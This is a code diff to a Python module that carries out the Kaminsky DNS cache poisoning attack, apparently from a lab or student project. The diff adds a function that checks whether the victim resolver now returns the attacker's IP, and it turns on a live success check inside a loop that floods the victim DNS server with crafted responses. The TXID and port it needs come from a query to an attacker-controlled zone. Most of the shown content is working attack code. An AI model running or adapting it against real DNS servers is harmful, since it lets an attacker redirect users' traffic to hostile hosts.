@@ -3,6 +3,7 @@
 ## @package DNS_Attack
 #   This package is responsible to execute all the passage required for the attack
 #
+
 import dns.resolver
 from dns.resolver import NoAnswer
 import socket
@@ -16,7 +17,7 @@ from enum import Enum
 from dns_poisoning import DNSPoisoning
 ##  @class DNSAttack
 #
-#   @brief Brief description
+#   @brief Class to handle DNSPoisonig procedures
 #
 #   This class provide an interface to perform the Kaminsky DNS poisoning attack.\n
 #   Apart from providing an interface to the DNSPoisoning module, it has function that allows to fetch the TXID and the port used by the target server.
@@ -47,7 +48,6 @@ class DNSAttack:
     #   @param sigint_handler    The functin to call when SIGINT signal is received
     #   @param log_function      The function to call when message need to be printed
     #
-    #   @todo Implement automatic NS server fetching when no ns_server_ip is passed
     #   @todo Check if port and IP are valid
 
     def __init__(self, victim_server_ip, attacked_domain, bad_server_data,\
@@ -184,13 +184,13 @@ class DNSAttack:
             raise self.InitialQueryFailed
 
     ## 
-    #   @brief Get IP of the NS server (Unimplemented)
+    #   @brief Get IP of the NS server 
     #   @param (str) domain           The domain used to fetch NS server
     #   @param (IP) dns_server_ip    The server where request should be sent
     #
     #   @return (IP) the NS server IP
     #
-    #   @exceptions DNSAttack.NSFetchError
+    #   @exceptions Raises DNSAttack.NSFetchError in case of fetching error
     #
     def get_authoritative_server(self, domain, dns_server_ip):
 
@@ -214,12 +214,46 @@ class DNSAttack:
         #If somethig went wrong
         raise self.NSFetchError
 
-    ##  Start
+    ##
+    #   @brief Check if the poisonig succeded
+    #   @param dns_server_ip    The server to check
+    #   @param spoofed_ip       The IP address that should be spoofed
+    #   @return True in case of success, False otherwire
+    #
+    #   Ask an "A" query to the victim server and check if the returned IP is the one inteded to spoof.\n
+    #   If no arguement is supplied, parameter are taken from the class attributes.
+
+    def check_poisoning(self, dns_server_ip=None, spoofed_ip=None):
+
+        if dns_server_ip is None:
+            dns_server_ip = self.victim_server_ip
+        if spoofed_ip is None:
+            spoofed_ip = self.attacker_ip
+
+        dns_server = dns.resolver.Resolver()
+        dns_server.nameservers = [dns_server_ip]
+
+        response = dns_server.query(self.domain, 'A')
+        if response.rrset is not None:
+            response_string = str(response.rrset)
+            ip_addr = re.findall("(?<=A).*", response_string)   #Get all char after 'A'
+            ip_addr = ip_addr[0].lstrip()
+
+            if ip_addr == spoofed_ip:
+                return True
+
+        return False       
+
+
+    ##  
     #   @brief Start the attack
     #   @param number_of_tries (int) The number of tentative (Default 50)
     #   @param mode (DNSAttack.Mode) The type of attack to be performed, see the above link
     #   @see DNSAttack::Mode
     #
+    #   @exceptions Raise DNSAttack::SuccessfulAttack in case of successful attack.\n
+    #   @exceptions Raise DNSAttack::CriticalError in case of error.\n
+    #   @exceptions Raise DNSAttack::InvalidAttackType in case an invalid attack type is provided.\n
     def start(self, number_of_tries=50, mode=Mode.NORMAL, attack_type=DNSPoisoning.AttackType.NORMAL):
 
         succeded = False
@@ -230,41 +264,51 @@ class DNSAttack:
 
         flood_socket = None
 
+        # Check the attack mode
+        # ---------------------------------------
         if mode == self.Mode.NORMAL:
             self.log("Using Normal Mode")
         elif mode == self.Mode.FAST:
             self.log("Using Faster Mode")
             self.log("Opening socket...")
             flood_socket = DNSPoisoning.create_socket(self, self.nic_interface)
+        #----------------------------------------
 
+        # Attack Loop
         while number_of_tries and not succeded and not self.stop_flag:
 
             self.log("\n ------ {t.bold}{t.shadow}Attack Number " + str(number_of_tries - num) + "{t.normal} ------\n")
 
-
+            ## Data Fetching code
+            #---------------------------------------------------------------------
             self.log("Starting DNS light server")
 
+            #Start the DNS listening server
             pool = ThreadPool(processes=1)
             async_data_result = pool.apply_async(self.get_server_data)
 
             self.log("\n\nStart sending the first request to \"{t.italic}badguy.ru{t.normal}\"")
             try:
-                self.send_initial_query() #Start the DNS listening server
+                self.send_initial_query()   # Send the query related to attacker control zone
             except self.InitialQueryFailed:
                 self.log("\n{t.red}Unable to get inital TXID, terminating...{t.normal}")
-                pool.terminate()    #Terminate the UDP server
+                pool.terminate()    # Terminate the UDP server
                 raise self.CriticalError
 
             fetched_id, source_port = async_data_result.get()  # get the return value from your function.
 
             self.log("Fetched ID: {t.green}{t.bold}" + str(fetched_id) + "{t.normal}")
             self.log("Source port: {t.blue}{t.bold}" + str(source_port) + "{t.normal}")
+            #---------------------------------------------------------------------
+
+
 
             # Create the Poisoning Object
             poison= DNSPoisoning(self.victim_server_ip, self.domain, self.attacker_ip, None, fetched_id, sport = source_port,\
                 victim_mac=self.victim_mac, interrupt_handler=self.stop_attack, log=self.log, socket=flood_socket)
 
             # Set the attack type
+            #--------------------------------------------------------
             if attack_type == DNSPoisoning.AttackType.NORMAL:
                 self.log("Ok, let's try to perform \"{t.italic}Classical's Shenanigans{t.normal}\" attack")
                 poison.set_attack_type(DNSPoisoning.AttackType.NORMAL)
@@ -273,12 +317,16 @@ class DNSAttack:
                 poison.set_attack_type(DNSPoisoning.AttackType.DAN)
             else:
                 raise self.InvalidAttackType
+            #--------------------------------------------------------
+
 
             #Attach SIGINT signal to the DNSPoisoning stop handler
             signal.signal(signal.SIGINT, poison.stop_handler)
 
-            self.log("Now the victim server wait for response, we {t.underline}flood a mass of crafted request{t.normal}...")
+            self.log("Now the victim server wait for response, we {t.underline}flood a mass of crafted request{t.normal}...", 3)
 
+            ## Start the specified Attack 
+            #--------------------------------------------------------
             if mode == self.Mode.NORMAL:
                 # Normal Flooding
                 try:
@@ -301,20 +349,16 @@ class DNSAttack:
                 except:
                     self.log("{t.underline}Unknow Error has occurred{t.normal}")
                     raise self.CriticalError
+            #--------------------------------------------------------
 
         
-
-
-            #time.sleep(1)
-
-            #self.log("Checking the attack results")
-            #if poison.check_poisoning():
-            #    self.log("\n\n{t.green}Attack Succeded{t.normal}!!!!")
-            #    succeded = True
-            #    time.sleep(2)
-            #    raise self.SuccessfulAttack
-            #else:
-            #    self.log("\n\n{t.red}{t.bold}Attack Failed{t.normal}!!!!")
-            #    num = num - 1
+            self.log("Checking the attack results", 2)
+            if self.check_poisoning():
+                self.log("\n\n{t.green}Attack Succeded{t.normal}!!!!")
+                succeded = True
+                raise self.SuccessfulAttack
+            else:
+                self.log("\n\n{t.red}{t.bold}Attack Failed{t.normal}!!!!")
+                num = num - 1
         
         self.log("Attack {t.red}{t.bold}STOPPED{t.normal}")
